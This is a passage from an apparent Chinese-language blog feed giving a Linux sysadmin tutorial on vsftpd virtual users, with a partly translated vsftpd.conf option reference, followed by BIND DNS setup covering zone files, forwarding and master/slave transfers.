&#x5F3A;&#x5236;&#x865A;&#x62DF;&#x7528;&#x6237;&#x53EA;&#x80FD;&#x8BBF;&#x95EE;&#x81EA;&#x5DF1;&#x7684;&#x4E3B;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x6587;&#x4EF6;</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>&#x521B;&#x5EFA;virtftp&#x7528;&#x6237;</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -d /var/ftp -M -s /sbin/nologin virtftp</span><br></pre></td></tr></tbody></table></figure><blockquote><p>&#x521B;&#x5EFA;ftp&#x865A;&#x62DF;&#x7528;&#x6237;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/vsftpd/vsftpd.conf</span><br><span class="line"><span class="comment"># &#x6DFB;&#x52A0;</span></span><br><span class="line">user_config_dir=/etc/vsftpd/vsftpd_user_conf</span><br><span class="line"></span><br><span class="line">mkdir /etc/vsftpd/vsftpd_user_conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;anon_world_readable_only=NO&quot;</span> &gt; /etc/vsftpd/vsftpd_user_conf/user1</span><br><span class="line"></span><br><span class="line">vim /etc/vsftpd/vsftpd_user_conf/user2</span><br><span class="line">anon_world_readable_only=NO</span><br><span class="line">write_enable=YES</span><br><span class="line">anon_upload_enable=YES</span><br></pre></td></tr></tbody></table></figure><h2 id="vsftpd-conf&#x53C2;&#x6570;&#x8BF4;&#x660E;"><a href="#vsftpd-conf&#x53C2;&#x6570;&#x8BF4;&#x660E;" class="headerlink" title="vsftpd.conf&#x53C2;&#x6570;&#x8BF4;&#x660E;"></a>vsftpd.conf&#x53C2;&#x6570;&#x8BF4;&#x660E;</h2><blockquote><p>&#x539F;&#x6587; <a href="http://vsftpd.beasts.org/vsftpd_conf.html#index" target="_blank" rel="noopener">http://vsftpd.beasts.org/vsftpd_conf.html#index</a></p></blockquote><h3 id="NAME"><a href="#NAME" class="headerlink" title="NAME"></a>NAME</h3><p>vsftpd.conf - vsftpd&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p><h3 id="DESCRIPTION"><a href="#DESCRIPTION" class="headerlink" title="DESCRIPTION"></a>DESCRIPTION</h3><blockquote><p><code>vsftpd.conf</code> &#x7528;&#x4E8E;&#x63A7;&#x5236;vsftpd&#x884C;&#x4E3A;&#x3002;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;vsftpd&#x5728;<code>/etc/vsftpd.conf</code> &#x4F4D;&#x7F6E;&#x67E5;&#x627E;&#x6B64;&#x6587;&#x4EF6;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x60A8;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;vsftpd&#x6307;&#x5B9A;&#x547D;&#x4EE4;&#x884C;&#x53C2;&#x6570;&#x6765;&#x8986;&#x76D6;&#x5B83;&#x3002;</p></blockquote><h3 id="FORMAT"><a href="#FORMAT" class="headerlink" title="FORMAT"></a>FORMAT</h3><blockquote><p><code>vsftpd.conf</code> &#x7684;&#x683C;&#x5F0F;&#x975E;&#x5E38;&#x7B80;&#x5355;&#x3002;&#x6BCF;&#x884C;&#x8981;&#x4E48;&#x662F;&#x6CE8;&#x91CA;&#xFF0C;&#x8981;&#x4E48;&#x662F;&#x6307;&#x4EE4;&#x3002;&#x6CE8;&#x91CA;&#x884C;&#x4EE5;<code>#</code> &#x5F00;&#x5934;&#x5E76;&#x88AB;vsftpd&#x5FFD;&#x7565;&#x3002;</p></blockquote><p><code>options=value</code>  &#x9009;&#x9879;=&#x503C;<br><strong>&#x6CE8;&#x610F;&#xFF01;</strong>&#x5728;&#x6BCF;&#x4E2A;=&#x548C;&#x5DE6;&#x53F3;&#x4E0D;&#x80FD;&#x6709;&#x7A7A;&#x683C;</p><h3 id="&#x5E03;&#x5C14;&#x9009;&#x9879;"><a href="#&#x5E03;&#x5C14;&#x9009;&#x9879;" class="headerlink" title="&#x5E03;&#x5C14;&#x9009;&#x9879;"></a>&#x5E03;&#x5C14;&#x9009;&#x9879;</h3><blockquote><p>&#x4E0B;&#x9762;&#x662F;Boolean&#x9009;&#x9879;&#x5217;&#x8868;&#x3002;&#x5E03;&#x5C14;&#x9009;&#x9879;&#x7684;&#x503C;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x4E3A;YES&#x6216;NO</p></blockquote><p><strong>allow_anon_ssl</strong><br>&#x53EA;&#x6709;<strong>ssl_enable=YES</strong>&#x65F6;&#x624D;&#x9002;&#x7528;&#x3002;&#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x4E3A;YES&#xFF0C;&#x533F;&#x540D;&#x7528;&#x6237;&#x5C06;&#x88AB;&#x5141;&#x8BB8;&#x4F7F;&#x7528;&#x5B89;&#x5168;&#x7684;SSL&#x8FDE;&#x63A5;&#x3002;</p><pre><code>- &#x9ED8;&#x8BA4;&#x503C;&#xFF1A;NO</code></pre><p><strong>anon_mkdir_write_enable</strong><br>    &#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x4E3A;YES&#xFF0C;&#x5C06;&#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x5728;&#x7279;&#x5B9A;&#x6761;&#x4EF6;&#x4E0B;&#x521B;&#x5EFA;&#x65B0;&#x76EE;&#x5F55;&#x3002;&#x4E3A;&#x6B64;&#xFF0C;&#x5FC5;&#x987B;&#x6FC0;&#x6D3B;<strong>write_enable</strong>&#xFF0C;&#x5E76;&#x4E14;ftp&#x533F;&#x540D;&#x7528;&#x6237;&#x5FC5;&#x987B;&#x5BF9;&#x7236;&#x76EE;&#x5F55;&#x5177;&#x6709;&#x5199;&#x6743;&#x9650;</p><pre><code>- &#x9ED8;&#x8BA4;&#x503C;&#xFF1A;NO</code></pre><p><strong>anon_other_write_enable</strong><br># &#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x88AB;&#x6267;&#x884C;&#x9664;&#x4E0A;&#x4F20;&#x548C;&#x521B;&#x5EFA;&#x76EE;&#x5F55;&#x4E4B;&#x5916;&#x7684;&#x5199;&#x64CD;&#x4F5C;&#xFF0C;&#x4F8B;&#x5982;&#x5220;&#x9664;&#x548C;&#x91CD;&#x547D;&#x540D;</p><p><strong>anon_upload_enable</strong><br># &#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x5728;&#x7279;&#x5B9A;&#x6761;&#x4EF6;&#x4E0B;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#xFF0C;&#x5728;<strong>write_enable</strong>&#x6FC0;&#x6D3B;&#x7684;&#x6761;&#x4EF6;&#x4E0B;&#x3002;&#x5E76;&#x4E14;&#x533F;&#x540D;&#x7528;&#x6237;&#x4E0A;&#x4F20;&#x4F4D;&#x7F6E;&#x5177;&#x6709;&#x5199;&#x5165;&#x6743;&#x9650;<br># &#x865A;&#x62DF;&#x7528;&#x6237;&#x4E0A;&#x4F20; &#x4E5F;&#x9700;&#x8981;&#x6B64;&#x8BBE;&#x7F6E;&#xFF1B;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x865A;&#x62DF;&#x7528;&#x6237;&#x5177;&#x6709;&#x533F;&#x540D;&#xFF08;&#x5373;&#x6700;&#x5927;&#x9650;&#x5236;&#xFF09;&#x6743;&#x9650;</p><ul><li>&#x9ED8;&#x8BA4;&#x503C;&#xFF1A;NO</li></ul><p><strong>anon_world_readable_only</strong><br># &#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x4E0B;&#x8F7D;&#x53EF;&#x8BFB;&#x6587;&#x4EF6;&#xFF0C;&#xFF08;&#x4E0D;&#x80FD;&#x5728;ftp&#x4E2D;&#x6253;&#x5F00;&#xFF09;</p><ul><li>&#x9ED8;&#x8BA4;&#x503C;&#xFF1A;YES</li></ul><p><strong>anonymous_enable</strong><br># &#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x767B;&#x5F55;&#xFF0C;&#x9ED8;&#x8BA4;&#x7528;&#x6237;&#x540D;&#xFF1A;<strong>ftp</strong> &#x3001;<strong>anonymous</strong><br>&#x9ED8;&#x8BA4;&#x503C;&#xFF1A;YES</p><p><strong>ascii_download_enable</strong><br># &#x4E0B;&#x8F7D;&#x65F6;&#x91C7;&#x7528;ASCII&#x6A21;&#x5F0F;&#x4F20;&#x8F93;&#x6570;&#x636E;</p><p><strong>ascii_upload_enable</strong><br># &#x4E0A;&#x4F20;&#x65F6;&#x63A5;&#x6536;ASCII&#x6A21;&#x5F0F;&#x6570;&#x636E;&#x4F20;&#x8F93;</p><p><strong>async_abor_enable</strong><br># &#x542F;&#x7528;<code>async ABOR</code> &#x7279;&#x6B8A;FTP&#x547D;&#x4EE4;&#x3002;&#x4E0D;&#x5EFA;&#x8BAE;&#x542F;&#x7528;</p><p><strong>background</strong><br># FTP&#x4EE5;<code>listen</code>&#x6A21;&#x5F0F;&#x542F;&#x52A8;&#xFF0C;</p><p><strong>check_shell</strong><br># &#x8BE5;&#x9009;&#x9879;&#x4EC5;&#x5BF9;&#x975E;PAM&#x6784;&#x5EFA;&#x7684;vsftpd&#x6709;&#x6548;&#x3002;&#x5982;&#x679C;&#x7981;&#x7528;&#xFF0C;vsftpd&#x5C06;&#x4E0D;&#x4F1A;&#x68C0;&#x67E5;/etc/shell&#x4EE5;&#x83B7;&#x53D6;&#x672C;&#x5730;&#x767B;&#x5F55;&#x7684;&#x6709;&#x6548;&#x7528;&#x6237;shell<br>&#x9ED8;&#x8BA4;&#x503C;&#xFF1A;YES</p><p><strong>chmod_enable</strong><br># &#x5141;&#x8BB8;&#x4F7F;&#x7528;SITE CHMOD&#x547D;&#x4EE4;&#x3002;&#x4EC5;&#x4F7F;&#x7528;&#x4E0E;&#x672C;&#x5730;&#x7528;&#x6237;&#x3002;&#x533F;&#x540D;&#x7528;&#x6237;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;SITE CHMOD&#x3002;<br>&#x9ED8;&#x8BA4;&#x503C;&#xFF1A;YES</p><p><strong>chown_uploads</strong><br># &#x6240;&#x6709;&#x533F;&#x540D;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x7684;&#x6240;&#x6709;&#x6743;&#x90FD;&#x5C06;&#x66F4;&#x6539;&#x4E3A;<strong>chown_username</strong>&#x9009;&#x9879;&#x6307;&#x5B9A;&#x7684;&#x7528;&#x6237;&#x3002;</p><p><strong>chroot_list_enable</strong><br># &#x53EA;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x81EA;&#x5DF1;&#x7684;&#x76EE;&#x5F55;&#x3002;<br># &#x5982;&#x679C;&#x542F;&#x7528;<strong>chroot_local_user</strong>&#xFF0C;&#x4E0E;&#x4E0A;&#x8FF0;&#x76F8;&#x53CD;</p><p><strong>chroot_local_user</strong><br># &#x672C;&#x5730;&#x7528;&#x6237;&#x767B;&#x5F55;&#x540E;&#x53EA;&#x80FD;&#x8BBF;&#x95EE;&#x81EA;&#x5DF1;&#x7684;&#x4E3B;&#x76EE;&#x5F55;</p><p><strong>connect_from_port_20</strong><br># &#x63A7;&#x5236;&#x7AEF;&#x53E3;&#x6570;&#x636E;&#x8FDE;&#x63A5;&#x662F;&#x5426;&#x4F7F;&#x7528;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x7AEF;&#x53E3;ftp&#x3002;</p><p><strong>debug_ssl</strong><br># OpenSSL&#x8FDE;&#x63A5;&#x8BCA;&#x65AD;&#x5C06;&#x8F6C;&#x5B58;&#x5230;vsftpd&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x3002;</p><p><strong>delete_failed_uploads</strong><br># &#x5220;&#x9664;&#x4EFB;&#x4F55;&#x5931;&#x8D25;&#x7684;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;</p><p><strong>deny_email_enable</strong><br># &#x5982;&#x679C;&#x6FC0;&#x6D3B;&#xFF0C;&#x60A8;&#x53EF;&#x4EE5;&#x63D0;&#x4F9B;&#x5BFC;&#x81F4;&#x767B;&#x5F55;&#x88AB;&#x62D2;&#x7EDD;&#x7684;&#x533F;&#x540D;&#x5BC6;&#x7801;&#x7535;&#x5B50;&#x90AE;&#x4EF6;&#x54CD;&#x5E94;&#x5217;&#x8868;&#x3002;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5305;&#x542B;&#x6B64;&#x5217;&#x8868;&#x7684;&#x6587;&#x4EF6;&#x662F; /etc/vsftpd.banned_emails&#xFF0C;&#x4F46;&#x60A8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;banned_email_file &#x8BBE;&#x7F6E;&#x8986;&#x76D6;&#x5B83; &#x3002;</p><p><strong>dirlist_enable</strong><br># &#x6240;&#x6709;&#x76EE;&#x5F55;&#x5217;&#x8868;&#x547D;&#x4EE4;&#x90FD;&#x5C06;&#x62D2;&#x7EDD;&#x6388;&#x6743;<br>&#x9ED8;&#x8BA4;&#x503C;&#xFF1A;YES</p><p><strong>dirmessage_enable</strong><br># &#x7528;&#x6237;&#x5728;&#x4ED6;&#x4EEC;&#x7B2C;&#x4E00;&#x6B21;&#x8FDB;&#x5165;&#x65B0;&#x76EE;&#x5F55;&#x65F6;&#x770B;&#x5230;&#x6D88;&#x606F;&#x3002;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x4F1A;&#x626B;&#x63CF;&#x76EE;&#x5F55;&#x4E2D;&#x7684;.message&#x6587;&#x4EF6;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;message_file&#x4FEE;&#x6539;</p><p><strong>download_enable</strong><br># &#x5141;&#x8BB8;&#x4E0B;&#x8F7D;&#x3002;&#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x4E3A;NO&#xFF0C;&#x6240;&#x6709;&#x4E0B;&#x8F7D;&#x8BF7;&#x6C42;&#x90FD;&#x5C06;&#x88AB;&#x62D2;&#x7EDD;<br>&#x9ED8;&#x8BA4;&#x503C;&#xFF1A;YES</p><p><strong>dual_log_enable</strong><br># &#x53CC;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x3002;&#x542F;&#x7528;&#x5C06;&#x751F;&#x6210; <strong>/var/log/xferlog</strong> &#x548C; <strong>/var/log/vsftpd.log</strong>&#x3002;&#x524D;&#x8005;&#x662F;wu-ftpd&#x98CE;&#x683C;&#x7684;&#x4F20;&#x8F93;&#x65E5;&#x5FD7;&#xFF0C;&#x53EF;&#x7531;&#x6807;&#x51C6;&#x5DE5;&#x5177;&#x89E3;&#x6790;&#x3002;&#x540E;&#x8005;&#x662F;vsftpd&#x7684;&#x98CE;&#x683C;&#x65E5;&#x5FD7;&#x3002;</p><p><strong>force_dot_files</strong><br># </p><p><strong>force_anon_data_ssl</strong><br><strong>force_local_logins_ssl</strong><br><strong>guest_enable</strong><br><strong>hide_ids</strong><br><strong>implicit_ssl</strong><br><strong>listen</strong><br><strong>listen_ipv6</strong><br><strong>local_enable</strong><br><strong>lock_upload_files</strong><br><strong>log_ftp_protocol</strong><br><strong>ls_recurse_enable</strong><br><strong>mdtm_write</strong><br><strong>no_anon_password</strong><br><strong>no_log_lock</strong><br><strong>one_process_model</strong><br><strong>passwd_chroot_enable</strong><br><strong>pasv_addr_resolv</strong><br><strong>pasv_enable</strong><br><strong>pasv_promiscuous</strong><br><strong>port_enable</strong><br><strong>port_promiscuous</strong><br><strong>require_cert</strong><br><strong>require_ssl_reuse</strong><br><strong>run_as_launching_user</strong><br><strong>secure_email_list_enable</strong><br><strong>session_support</strong><br><strong>setproctitle_enable</strong><br><strong>ssl_enable</strong><br><strong>ssl_request_cert</strong><br><strong>ssl_sslv2</strong><br><strong>ssl_sslv3</strong><br><strong>ssl_tlsv1</strong><br><strong>strict_ssl_read_eof</strong><br><strong>strict_ssl_write_shutdown</strong><br><strong>syslog_enable</strong><br><strong>tcp_wrappers</strong><br><strong>text_userdb_names</strong><br><strong>tilde_user_enable</strong><br><strong>use_localtime</strong><br><strong>use_sendfile</strong><br><strong>userlist_deny</strong><br><strong>userlist_enable</strong><br><strong>calidate_cert</strong><br><strong>virtual_use_local_privs</strong><br><strong>write_enable</strong><br><strong>xferlog_enable</strong><br><strong>xferlog_std_format</strong></p><h3 id="&#x6570;&#x503C;&#x9009;&#x9879;"><a href="#&#x6570;&#x503C;&#x9009;&#x9879;" class="headerlink" title="&#x6570;&#x503C;&#x9009;&#x9879;"></a>&#x6570;&#x503C;&#x9009;&#x9879;</h3><p><strong>accept_timeout</strong><br><strong>anon_max_rate</strong><br><strong>anon_umask</strong><br><strong>chown_upload_mode</strong><br><strong>connect_timeout</strong><br><strong>data_connection_timeout</strong><br><strong>delay_failed_login</strong><br><strong>delay_successful_login</strong><br><strong>file_open_mode</strong><br><strong>ftp_data_port</strong><br><strong>idle_session_timeout</strong><br><strong>listen_port</strong><br><strong>local_max_rate</strong><br><strong>local_umask</strong><br><strong>max_clients</strong><br><strong>max_login_fails</strong><br><strong>max_per_ip</strong><br><strong>pasv_max_port</strong><br><strong>pasv_min_port</strong><br><strong>trans_chunk_size</strong></p><h3 id="&#x5B57;&#x7B26;&#x4E32;&#x9009;&#x9879;"><a href="#&#x5B57;&#x7B26;&#x4E32;&#x9009;&#x9879;" class="headerlink" title="&#x5B57;&#x7B26;&#x4E32;&#x9009;&#x9879;"></a>&#x5B57;&#x7B26;&#x4E32;&#x9009;&#x9879;</h3><p><strong>anon_root</strong><br><strong>banned_email_file</strong><br><strong>banner_file</strong><br><strong>ca_certs_file</strong><br><strong>chown_username</strong><br><strong>chroot_list_file</strong><br><strong>cmds_allowed</strong><br><strong>cmds_denied</strong><br><strong>deny_file</strong><br><strong>dsa_cert_file</strong><br><strong>dsa_private_key_file</strong><br><strong>email_password_file</strong><br><strong>ftp_username</strong><br><strong>ftpd_banner</strong><br><strong>guest_username</strong><br><strong>hide_file</strong><br><strong>listen_address</strong><br><strong>listen_address6</strong><br><strong>local_root</strong><br><strong>message_file</strong><br><strong>nopriv_user</strong><br><strong>pam_service_name</strong><br><strong>pasv_address</strong><br><strong>rsa_cert_file</strong><br><strong>rsa_private_key_file</strong><br><strong>secure_chroot_dir</strong><br><strong>ssl_ciphers</strong><br><strong>user_config_dir</strong><br><strong>user_sub_token</strong><br><strong>userlist_file</strong><br><strong>vsftpd_log_file</strong><br><strong>xferlog_file</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;TFTP&quot;&gt;&lt;a href=&quot;#TFTP&quot; class=&quot;headerlink&quot; title=&quot;TFTP&quot;&gt;&lt;/a&gt;TFTP&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&amp;#x7B80;&amp;#x5355;&amp;#x6587;&amp;#x4EF6;&amp;#x4F20;&amp;#x8F93;&amp;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>DNS Server的配置与管理</title>
    <link href="https://marnm.github.io//posts/4782a8c2/"/>
    <id>https://marnm.github.io//posts/4782a8c2/</id>
    <published>2022-06-07T04:35:39.000Z</published>
    <updated>2022-06-07T05:25:10.622Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x914D;&#x7F6E;&#x5B9E;&#x73B0;"><a href="#&#x914D;&#x7F6E;&#x5B9E;&#x73B0;" class="headerlink" title="&#x914D;&#x7F6E;&#x5B9E;&#x73B0;"></a>&#x914D;&#x7F6E;&#x5B9E;&#x73B0;</h2><blockquote><p>&#x4FEE;&#x6539;/etc/named.conf&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">options {</span><br><span class="line">    listen-on port 53 { any; };</span><br><span class="line">    listen-on-v6 port 53 { any; };</span><br><span class="line">    ...</span><br><span class="line">    allow-query { any; };</span><br><span class="line">    ...</span><br><span class="line">    recursion yes;  # &#x662F;&#x5426;&#x542F;&#x7528;&#x9012;&#x5F52;&#x67E5;&#x8BE2;</span><br><span class="line">    </span><br><span class="line">    dnssec-enable yes;</span><br><span class="line">    dnssec-validation yes;</span><br><span class="line">    dnssec-lookaside auto;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">##------------------------------------------------</span><br><span class="line">## &#x8BE5;&#x914D;&#x7F6E;&#x5EFA;&#x8BAE;&#x6DFB;&#x52A0;&#x5230;/etc//etc/named.rfc1912.zones</span><br><span class="line"># &#x65B0;&#x589E;&#x5982;&#x4E0B;</span><br><span class="line">zone &quot;abc.cn&quot; IN {</span><br><span class="line">    type master;</span><br><span class="line">    file &quot;abc.cn.zone&quot;;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line">zone &quot;73.168.192.in-addr.arpa&quot; IN {</span><br><span class="line">    type master;</span><br><span class="line">    file &quot;192.168.73.arpa&quot;;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x6DFB;&#x52A0;&#x6B63;&#x53CD;&#x5411;&#x89E3;&#x6790;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> &#x590D;&#x5236;&#x6B63;&#x5411;&#x89E3;&#x6790;&#x914D;&#x7F6E;&#x6A21;&#x677F;</span></span><br><span class="line">cp -p /var/named/named.localhost /var/named/abc.cn.zone</span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x590D;&#x5236;&#x53CD;&#x5411;&#x89E3;&#x6790;&#x914D;&#x7F6E;&#x6A21;&#x677F;</span></span><br><span class="line">cp -p /var/named/named.empty /var/named/192.168.73.arpa</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#############################################</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x6DFB;&#x52A0;&#x6B63;&#x5411;&#x89E3;&#x6790;&#x914D;&#x7F6E;</span></span><br><span class="line">vim /var/named/abc.cn.zone</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$TTL 1D</span><br><span class="line">abc.cn. IN SOA  dns.abc.cn. root.abc.cn. (</span><br><span class="line">                    0   ; serial</span><br><span class="line">                    1D  ; refresh</span><br><span class="line">                    1H  ; retry</span><br><span class="line">                    1W  ; expire</span><br><span class="line">                    3H )    ; minimum</span><br><span class="line">abc.cn. NS  dns.abc.cn.</span><br><span class="line">dns.abc.cn. A   192.168.73.5</span><br><span class="line">www.abc.cn. A   192.168.73.5</span><br><span class="line">www1.abc.cn.    CNAME   www.abc.cn.</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6DFB;&#x52A0;&#x53CD;&#x5411;&#x89E3;&#x6790;&#x914D;&#x7F6E;</span></span><br><span class="line">vim /var/named/192.168.73.arpa</span><br><span class="line"></span><br><span class="line">$TTL 3H</span><br><span class="line">@   IN SOA  abc.cn. root.abc.cn. (</span><br><span class="line">                    0   ; serial</span><br><span class="line">                    1D  ; refresh</span><br><span class="line">                    1H  ; retry</span><br><span class="line">                    1W  ; expire</span><br><span class="line">                    3H )    ; minimum</span><br><span class="line">    NS  ns.abc.cn.</span><br><span class="line">ns  A   192.168.73.5</span><br><span class="line">5   PTR ns.abc.cn.</span><br><span class="line">5   PTR www.abc.cn.</span><br></pre></td></tr></tbody></table></figure><h3 id="&#x914D;&#x7F6E;DNS&#x8F6C;&#x53D1;"><a href="#&#x914D;&#x7F6E;DNS&#x8F6C;&#x53D1;" class="headerlink" title="&#x914D;&#x7F6E;DNS&#x8F6C;&#x53D1;"></a>&#x914D;&#x7F6E;DNS&#x8F6C;&#x53D1;</h3><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/named.conf</span><br><span class="line"><span class="comment">################</span></span><br><span class="line">options{</span><br><span class="line">    forward first;</span><br><span class="line">    <span class="comment"># &#x591A;&#x4E2A;DNS&#x7528;;&#x9694;&#x5F00;</span></span><br><span class="line">    forwarders {</span><br><span class="line">        192.168.73.2;</span><br><span class="line">        114.114.114.114;</span><br><span class="line">        8.8.8.8;</span><br><span class="line">        8.8.4.4;</span><br><span class="line">        1.1.1.1;</span><br><span class="line">    };</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;DNS&#x670D;&#x52A1;"><a href="#&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;DNS&#x670D;&#x52A1;" class="headerlink" title="&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;DNS&#x670D;&#x52A1;"></a>&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;DNS&#x670D;&#x52A1;</h2><blockquote><p>&#x4E3B;&#x4ECE;&#x673A;&#x5668;&#x8FDB;&#x884C;&#x65F6;&#x95F4;&#x540C;&#x6B65;</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpd</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x4FEE;&#x6539;&#x4E3B;DNS&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/named.conf</span><br><span class="line">###################</span><br><span class="line">zone &quot;abc.cn&quot; IN {</span><br><span class="line">    type master;</span><br><span class="line">    file &quot;abc.cn.zone&quot;;</span><br><span class="line">    allow-transfer { 192.168.73/24; };  # &#x6DFB;&#x52A0;&#x8BE5;&#x53C2;&#x6570;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line">zone &quot;73.168.192.in-addr.arpa&quot; IN {</span><br><span class="line">    type master;</span><br><span class="line">    file &quot;192.168.73.arpa&quot;;</span><br><span class="line">    allow-transfer { 192.168.73/24; };  # &#x6DFB;&#x52A0;&#x8BE5;&#x53C2;&#x6570;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x4FEE;&#x6539;&#x4ECE;DNS&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;</strong></p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/named.conf</span><br><span class="line">options{</span><br><span class="line">    listen-on port 53 { any; };</span><br><span class="line">    listen-on-v6 port 53 { any; };</span><br><span class="line">    ...</span><br><span 